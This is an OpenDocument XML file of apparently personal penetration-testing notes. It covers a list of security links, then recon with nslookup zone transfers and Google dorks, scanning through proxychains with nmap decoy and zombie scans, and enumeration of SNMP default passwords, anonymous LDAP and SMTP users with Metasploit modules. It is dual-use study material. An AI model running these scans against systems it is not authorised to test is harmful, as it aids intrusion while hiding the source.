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text-properties officeooo:paragraph-rsid="00167f63"/>
    </style:style>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1">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4">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14">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L17">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L18">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L19">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L20">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L21">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L22">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L23">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L24">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L30">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L36">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L38">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L39">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L41">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Quotations">
      <style:text-properties officeooo:paragraph-rsid="00148a88"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:paragraph-rsid="00167f63"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="00148a88"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:paragraph-rsid="00148a88"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:paragraph-rsid="00173579"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00148a88"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00167f6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wiki-body">
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">1. </text:span>www.txt2re.com == good page to generate regular expression</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">2. </text:span>advanced subnet calculator == win program really good for network calculations (also in Android)</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">3. </text:span>mailinator == mail without a mail</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">4. </text:span><text:a xlink:type="simple" xlink:href="http://www.outpost9.com/files/WordLists.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://www.outpost9.com/files/WordLists.html</text:a> == different wordlist download</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">5. </text:span><text:a xlink:type="simple" xlink:href="http://proxytunnel.sourceforge.net/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://proxytunnel.sourceforge.net/</text:a> == script that also provide a basic non-interactive shell on remote systems behind firewalls</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">6. </text:span><text:a xlink:type="simple" xlink:href="https://www.virustotal.com/en/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.virustotal.com/en/</text:a> == check for viruses on file, web page or ip etc.</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">7. </text:span><text:a xlink:type="simple" xlink:href="https://wigle.net/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://wigle.net/</text:a> and <text:a xlink:type="simple" xlink:href="https://www.google.pl/maps/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.google.pl/maps/</text:a> == best for recon purpose</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">8. </text:span><text:a xlink:type="simple" xlink:href="https://www.phishtank.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.phishtank.com/</text:a> == I can check if web page is used for fishing purposes</text:p>
        <text:p text:style-name="P68"><text:span text:style-name="T1">9. </text:span><text:a xlink:type="simple" xlink:href="https://www.shodan.io/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.shodan.io/</text:a> == is a search engine that lets the user find specific types of computers (web cams, routers, servers, etc.) connected to the internet using a variety of filters. Some have also described it as a search engine of service banners, which are meta-data the server sends back to the client.[1] This can be information about the server software, what options the service supports, a welcome message or anything else that the client can find out before interacting with the server. Shodan collects data mostly on web servers (HTTP/HTTPS - port 80, 8080, 443, 8443), as well as FTP (port 21), SSH (port 22), Telnet (port 23), SNMP (port 161), SIP (port 5060),[2] and Real Time Streaming Protocol (RTSP, port 554)<text:line-break/><text:span text:style-name="T1">==============================================================</text:span></text:p>
        <text:p text:style-name="P68"><text:span text:style-name="T1">1. </text:span><text:a xlink:type="simple" xlink:href="http://www.blackviper.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://www.blackviper.com/</text:a> == for service configuration on windows</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">2. </text:span>driver easy == best for installing windows drivers</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">3. </text:span><text:a xlink:type="simple" xlink:href="https://www.sans.org/security-resources/policies" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.sans.org/security-resources/policies</text:a> == Information Security Policy Templates</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">4. </text:span><text:a xlink:type="simple" xlink:href="https://www.cloudflare.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.cloudflare.com</text:a> == protects from DDoS (good cloud solution)</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">5. </text:span><text:a xlink:type="simple" xlink:href="https://www.fail2ban.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.fail2ban.org</text:a> == Fail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">6. </text:span><text:a xlink:type="simple" xlink:href="https://www.snort.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.snort.org/</text:a> == Network Intrusion Detection &amp; Prevention System</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">7. </text:span><text:a xlink:type="simple" xlink:href="https://www.modsecurity.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.modsecurity.org/</text:a> == good Open Source Web Application Firewall</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">8. </text:span><text:a xlink:type="simple" xlink:href="https://ossec.github.io/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://ossec.github.io/</text:a> == free, open-source host-based intrusion detection system (HIDS)</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">9. </text:span><text:a xlink:type="simple" xlink:href="https://www.microsoft.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.microsoft.com</text:a> == EMET (Enhanced Mitigation Experience Toolkit) for risk and management on Windows up from 7</text:p>
        <text:p text:style-name="Quotations"><text:span text:style-name="T1">10. </text:span><text:a xlink:type="simple" xlink:href="https://suhosin.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://suhosin.org</text:a> == great for PHP protection (web sites and application)</text:p>
      </text:section>
      <text:h text:style-name="P71" text:outline-level="1"><text:soft-page-break/>1. Recon</text:h>
      <text:section text:style-name="Sect1" text:name="wiki-content">
        <text:section text:style-name="Sect1" text:name="Sekcja1">
          <text:h text:style-name="P70" text:outline-level="2"><text:bookmark text:name="wiki-body"/><text:bookmark text:name="user-content-1-what-to-looking-at-"/>1. What to looking at ??</text:h>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-2-whois-netcraft-"/>2. whois, netcraft ??</text:h>
          <text:list xml:id="list3096265539" text:style-name="L1">
            <text:list-item>
              <text:p text:style-name="P48">whois == info about domain. Also <text:a xlink:type="simple" xlink:href="http://whois.domaintools.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://whois.domaintools.com/</text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://www.netcraft.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.netcraft.com/</text:a> == check web fro systems and others (passive) </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-3-dns-by-the-nslookup-"/>3. DNS by the nslookup ??</text:h>
          <text:list xml:id="list2335533878" text:style-name="L2">
            <text:list-item>
              <text:p text:style-name="P2">nslookup (passive)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">To perform a DNS lookup, simply enter the domain or subdomain you would like to query and press enter on your keyboard.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">The set type command will let you query a particular type of DNS record. For example, if you wanted to check the MX (mail) records for a particular domain, you would type the following:<text:line-break/><text:span text:style-name="Emphasis">set type=mx</text:span><text:line-break/>You can now perform another lookup on the domain name, and only the MX records will be returned. mineDomain.com</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">Change the server. When you first start NSLookup it will query your local DNS server. This is likely to be your router or Internet Service Provider's DNS servers. As a result, you may not also receive accurate results, as the server you are querying may not exist in your local DNS server. NSLookup allows you to change the nameserver you query, to ensure you query a nameserver from which you are guaranteed to get an accurate result. If you query the nameserver listed against the domain name you will receive an authoritative answer, because the nameserver has authority over the DNS for the domain name. Start by retrieving the nameserver's for the domain name by using the set type command and then querying the domain.<text:line-break/><text:span text:style-name="Emphasis">set type=ns</text:span><text:line-break/><text:span text:style-name="Emphasis">mineDomain.com</text:span><text:line-break/>You can see from the results that mineDomain.com has two nameserver's, ns1.livedns.co.uk and ns2.livedns.co.uk. We can now switch NSlookup to query one of those authoritative nameserver's for this domain name.<text:line-break/><text:span text:style-name="Emphasis">server ns1.livedns.co.uk</text:span><text:line-break/>set type is still set to query nameserver records, so change the type back to query the record you need (for example A record, MX record). In this example we shall retrieve the A records for the domain.<text:line-break/><text:span text:style-name="Emphasis">set type=a</text:span><text:line-break/>And finally, query the domain name.<text:line-break/><text:span text:style-name="Emphasis">mineDomain.com</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2"><text:soft-page-break/>addition<text:line-break/><text:span text:style-name="Emphasis">set type=cname</text:span> == set for lookup primary server<text:line-break/><text:span text:style-name="Emphasis">set type=soa</text:span> == check for authoritative server</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">show "zone transfer" (everything about their computers)<text:line-break/><text:span text:style-name="Emphasis">server ip.number.from.ping</text:span><text:line-break/><text:span text:style-name="Emphasis">set type=any</text:span><text:line-break/><text:span text:style-name="Emphasis">ls -d lol.org</text:span></text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-4-specify-a-network-range-tracerout--whois-"/>4. Specify a network range (tracerout &amp; whois)</text:h>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-5-search-simple-and-by-the-google-search-database-"/>5. Search simple and by the google search database</text:h>
          <text:list xml:id="list1779543544" text:style-name="L3">
            <text:list-item>
              <text:p text:style-name="P49">"something" funny == must contains exactly word something </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">banana -loki == every web contains banana but not loki word </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">cache:www.lolo.pl == cache for cached page (something like archive.org bot not witch their power) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">link:www.lolol.pl == show web page that have link to my target </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">related:www.lolo.pl == show similar web page </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">allinurl:lolo.pl == show the sites conteins "lolo.pl" in their url (very similar to inurl:) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P49">intitle:"index of" == show web page witch got "index of" in page title (in that example structure directory) very similar to allintitle: </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P3">??google hacking database is sweet </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-6-website-search-by-time-back-machine-and-more-"/>6. Website search by time back machine and more</text:h>
          <text:list xml:id="list3514381538" text:style-name="L4">
            <text:list-item>
              <text:p text:style-name="P50">archive.org == beck to the past </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P50">dogpile.com == is a metasearch engine for information on the World Wide Web that fetches results from Google, Yahoo!, and Yandex, and includes results from several other popular search engines, including those from audio and video content providers </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P50">httrack == download all web-page (also on Linux ??) (passive) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P4">burpsiut </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-7-email-simple-send-a-offer-and-look-what-back-to-you-"/>7. Email. Simple send a offer and look what back to you</text:h>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-8-check-what-competitors-do-"/>8. Check what competitors do</text:h>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-9-check-social-media-do-social-engineering-"/>9. Check social media. Do social engineering</text:h>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-10-sum-it-up-"/>10. Sum it up</text:h>
        </text:section>
      </text:section>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:soft-page-break/>2. Scanning<text:bookmark text:name="wiki-content"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja2">
        <text:section text:style-name="Sect1" text:name="Sekcja3">
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="wiki-body1"/><text:bookmark text:name="user-content-1-be-anonymous-"/>1. Be anonymous</text:h>
          <text:list xml:id="list1331972973" text:style-name="L5">
            <text:list-item>
              <text:p text:style-name="P5">Proxychains </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">emacs -nw /etc/proxychains.conf</text:span></text:p>
          <text:p text:style-name="Text_20_body">Search for add proxy hear and add main proxy Default is 127.0.0.1 on port 9050 (the default Tor configuration) but I can use different. Save file !<text:line-break/>And now magic (everything goes by set up proxy)</text:p>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">proxychains nmap -sS 8.26.65.101</text:span></text:p>
          <text:list xml:id="list3492674427" text:style-name="L6">
            <text:list-item>
              <text:p text:style-name="P6">Anonymizers<text:line-break/>good for that is Hackplayers/4nonimizer<text:line-break/>all is described on their git repo </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-2-use-proper-tools-"/>2. Use proper tools</text:h>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-a-netdiscover"/>a) netdiscover</text:h>
          <text:list xml:id="list1616048122" text:style-name="L7">
            <text:list-item>
              <text:p text:style-name="P7">only on kali. This tool discover the IP's on an internal network -r switch (for range) and then in CIDR. Example scan </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">netdiscover -r 192.168.1.0/24</text:span></text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-b-firewalk"/>b) firewalk</text:h>
          <text:list xml:id="list44961211" text:style-name="L8">
            <text:list-item>
              <text:p text:style-name="P51">attempts to determine what layer 4 protocols a given IP forwarding device will pass </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P8">Scan ports 8079-8081 (-S8079-8081) through the eth0 interface (-i eth0), do not resolve hostnames (-n), use TCP (-pTCP) via the gateway (192.168.1.1) against the target IP (192.168.0.1): </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1</text:span></text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-c-nc--netcat"/>c) nc == netcat</text:h>
          <text:list xml:id="list55675529" text:style-name="L9">
            <text:list-item>
              <text:p text:style-name="P9">helpful in discovering open ports on a machine. </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">nc -z -vv -w 1 192.168.1.100 20-25</text:span></text:p>
          <text:p text:style-name="Text_20_body">-z == Zero-I/O mode, report connection status only<text:line-break/>-vv == Use more than once (-vv, -vvv...) for greater verbosity. With -v it will be verbose and display all kinds of useful connection based information<text:line-break/>-w 1 == wait for 1 sec<text:line-break/>20-25 == port range</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-d-nmap"/>d) nmap</text:h>
          <text:list xml:id="list3968923937" text:style-name="L10">
            <text:list-item>
              <text:p text:style-name="P10">-sN, -sF, -sX == almost the same. Preferable -sN. Good for Unix scan (quiet but may be detected by IDS)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10"><text:soft-page-break/>-sA == only ACK flag. Unfiltered = ACK can reach port but it do not precise state of that port. Ports witch no respond will by classified as filtered. Very safe scan.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">-O == verifies operating system (aggressive)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">-sV == service verification (aggressive)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">-A == combined option -O and -sV + others nmap scripts (very aggressive)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">-f == fragmentation scan creates smaller packages reassemble in target (quiet)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">spoofing ip (quiet)<text:line-break/><text:span text:style-name="Emphasis">nmap -D RND 192.168.1.110</text:span><text:line-break/>192.168.1.110 == target</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">zombi scan (quiet)<text:line-break/>check if system can perform a scan<text:line-break/><text:span text:style-name="Emphasis">nmap --script ipidseq 192.168.1.0-255</text:span><text:line-break/>looking for main zombi ip (Host script results == ipidseq: Incremental) and using it.<text:line-break/><text:span text:style-name="Emphasis">nmap -sI 192.168.1.100 -Pn 192.168.1.111</text:span><text:line-break/>-sI == idle(zombi 192.168.1.100 from previous scan)<text:line-break/>-Pn == no ping (target 192.168.1.111)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P10">Ps. By nmap I can find a sniffers on the network by simply:<text:line-break/><text:span text:style-name="Emphasis">nmap --script sniffer-detect 192.168.1.0/24</text:span></text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-e-xprobe2"/>e) xprobe2</text:h>
          <text:list xml:id="list2825146958" text:style-name="L11">
            <text:list-item>
              <text:p text:style-name="P11">useful program for verifying operating system on the host. Simple: xprobe2 targetIp </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-f-openvas"/>f) openVas</text:h>
          <text:list xml:id="list3446309366" text:style-name="L12">
            <text:list-item>
              <text:p text:style-name="P12">use of vulnerability scanner. Another free are MBSA (Windows) and Secunia PSI (Windows). Commercial on the other hand are: Nessus, Retina, CORE Impact, Nexpose <text:span text:style-name="T2">itd.</text:span></text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="P69" text:outline-level="3"><text:bookmark text:name="user-content-g-sparta"/>g) sparta</text:h>
          <text:list xml:id="list1330231506" text:style-name="L13">
            <text:list-item>
              <text:p text:style-name="P13">SPARTA is a python GUI application which simplifies network infrastructure penetration testing by aiding the penetration tester in the scanning and enumeration phase. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P13">this is a great tool that combines many different tools not only for scanning and enumeration but also for hydra brute-force attack</text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-h-also-usefulactual-vulnerabilities"/>h) also useful/actual vulnerabilities</text:h>
          <text:list xml:id="list1273332514" text:style-name="L14">
            <text:list-item>
              <text:p text:style-name="P52"><text:span text:style-name="Emphasis">national vulnerability databases web page (</text:span><text:a xlink:type="simple" xlink:href="https://nvd.nist.gov/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">https://nvd.nist.gov/</text:span></text:a><text:span text:style-name="Emphasis">)</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P52"><text:a xlink:type="simple" xlink:href="https://www.securityfocus.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">https://www.securityfocus.com/</text:span></text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P52"><text:a xlink:type="simple" xlink:href="http://cve.mitre.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">http://cve.mitre.org/</text:span></text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="https://0day.today/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">https://0day.today/</text:span></text:a> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-i-i-can-check-for-potential-flaws-using-a-fuzzers-like-intruder-in-burpsiut"/>i) I can check for potential flaws using a fuzzers like intruder in BurpSiut.</text:h>
          <text:list xml:id="list3395312785" text:style-name="L15">
            <text:list-item>
              <text:p text:style-name="P15">Lists for payloads may came from different places. For example kali wordlists. But great place to start is <text:a xlink:type="simple" xlink:href="https://github.com/fuzzdb-project/fuzzdb" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/fuzzdb-project/fuzzdb</text:a> </text:p>
            </text:list-item>
          </text:list>
        </text:section>
      </text:section>
      <text:h text:style-name="P72" text:outline-level="1"><text:soft-page-break/>3. Enumeration</text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja4">
        <text:section text:style-name="Sect1" text:name="Sekcja5">
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="wiki-body2"/><text:bookmark text:name="user-content-if-i-dont-have-any-users-name-e-mail-information-about-users-after-a-recon-phase-i-may-use-enumeration-technique-this-provides-information-i-mention-above-and-many-more-system-information-used-disks-groups-of-users-etc"/>If I don't have any users name, e-mail, information about users after a recon phase, I may use enumeration technique. This provides information I mention above and many more (system information, used disks, groups of users etc.)</text:h>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis">I may use enumeration either whey to additional check a data I poses and all the goodies above it :)<text:line-break/>PS Always look at auxiliary/scanner/ for enumerators in metasploit</text:span></text:span></text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-1-netbios-in-windowsxp"/>1. NetBios in WindowsXP</text:h>
          <text:list xml:id="list2515338367" text:style-name="L16">
            <text:list-item>
              <text:p text:style-name="P16">For that SuperScan by MCAffe. This is a simple windows program. </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-2-enumeration-by-snmp-simple-network-management-protocol"/>2. Enumeration by SNMP (Simple Network Management Protocol)</text:h>
          <text:list xml:id="list3929145124" text:style-name="L17">
            <text:list-item>
              <text:p text:style-name="P53">Default passwords are "public" or "private" </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P17">use metasploit and <text:span text:style-name="Emphasis">auxiliary/scanner/snmp/snmp_login</text:span> for checking above passwords.<text:line-break/>If results are ok then use <text:span text:style-name="Emphasis">auxiliary/scanner/snmp/snmp_enum</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-3-enumeration-by-ldap-for-example-active-directory-ad-is-database-of-user-accounts-and-many-more-on-windows"/>3. Enumeration by LDAP (for example Active Directory; AD is database of user accounts and many more on Windows)</text:h>
          <text:list xml:id="list708689481" text:style-name="L18">
            <text:list-item>
              <text:p text:style-name="P54">Open ports that suggest a presence of that service == 389, 636, 3268, 3268 </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P54">First above ports must be open </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P18">Second I can use <text:span text:style-name="Emphasis">JXplorer</text:span> and try login to the target like Anonymous user with no passwords<text:line-break/>Hint** use Table Editor after go to the directory </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-4-enumeration-by-smtp-simple-mail-transfer-protocol"/>4. Enumeration by SMTP (Simple Mail Transfer Protocol)</text:h>
          <text:list xml:id="list3665000370" text:style-name="L19">
            <text:list-item>
              <text:p text:style-name="P55">ports 25 and 587 (submission) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P55">use metasploit and <text:span text:style-name="Emphasis">auxiliary/scanner/smtp/smtp_version</text:span> for checking.<text:line-break/>If results are ok then use <text:span text:style-name="Emphasis">auxiliary/scanner/smtp/smtp_enum</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P19">after that I may also search executable program <text:span text:style-name="Emphasis">smtp-user-enum.pl</text:span><text:line-break/>when I run it <text:span text:style-name="Emphasis">(./smtp-user-enum.pl)</text:span> I get help options. Example usage is<text:line-break/><text:span text:style-name="Emphasis">./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-5-enumeration-by-dns"/>5. Enumeration by DNS</text:h>
          <text:list xml:id="list1117175629" text:style-name="L20">
            <text:list-item>
              <text:p text:style-name="P56">Port 53 (UDP or TCP) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P56">nslookup on the first place </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P20">then is something like <text:span text:style-name="Emphasis">dnsrecon</text:span> simply use <text:span text:style-name="Emphasis">dnsrecon -d strona.org</text:span> for lookup or<text:line-break/><text:span text:style-name="Emphasis">dnsrecon -r 192.168.1.120-192.168.1.139</text:span> for reverse lookup<text:line-break/>for zone walking <text:span text:style-name="Emphasis">dnsrecon -d strona.org -t zonewalk</text:span> </text:p>
